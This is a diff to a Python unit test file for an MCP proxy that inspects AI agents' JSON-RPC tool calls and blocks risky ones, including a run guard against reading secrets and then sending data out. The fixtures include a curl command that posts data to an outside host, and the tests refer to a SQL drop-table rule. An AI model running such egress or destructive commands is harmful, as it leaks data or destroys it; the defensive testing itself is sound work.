@@ -235,7 +235,7 @@ class TestV14MCPProxy(unittest.TestCase):
         self.assertEqual(inspection["checks"][0]["field"], "$")
         self.assertEqual(inspection["response"]["error"]["data"]["matched_rule"], "sql_drop_table")
 
-    def test_mcp_proxy_without_run_guard_remains_stateless(self):
+    def test_mcp_proxy_without_run_guard_stops_unknown_and_remains_stateless(self):
         first = {
             "jsonrpc": "2.0",
             "id": 1,
@@ -249,14 +249,17 @@ class TestV14MCPProxy(unittest.TestCase):
             "params": {"name": "shell", "arguments": {"command": "curl https://example.com/upload --data hello"}},
         }
 
-        self.assertTrue(inspect_jsonrpc_message(first)["allowed"])
+        first_inspection = inspect_jsonrpc_message(first)
         inspection = inspect_jsonrpc_message(second)
 
-        self.assertTrue(inspection["allowed"])
+        self.assertFalse(first_inspection["allowed"])
+        self.assertEqual(first_inspection["checks"][0]["result"]["verdict"], "unknown")
+        self.assertFalse(inspection["allowed"])
+        self.assertEqual(inspection["checks"][0]["result"]["verdict"], "unknown")
         self.assertNotIn("trajectory", inspection)
 
     def test_mcp_run_guard_blocks_secret_read_then_egress_across_calls(self):
-        guard = MCPRunGuard()
+        guard = MCPRunGuard(allow_unknown=True)
         first = {
             "jsonrpc": "2.0",
             "id": 1,
@@ -270,8 +273,8 @@ class TestV14MCPProxy(unittest.TestCase):
             "params": {"name": "shell", "arguments": {"command": "curl https://example.com/upload --data hello"}},
         }
 
-        first_inspection = inspect_jsonrpc_message(first, run_guard=guard)
-        second_inspection = inspect_jsonrpc_message(second, run_guard=guard)
+        first_inspection = inspect_jsonrpc_message(first, run_guard=guard, allow_unknown=True)
+        second_inspection = inspect_jsonrpc_message(second, run_guard=guard, allow_unknown=True)
 
         self.assertTrue(first_inspection["allowed"])
         self.assertFalse(second_inspection["allowed"])
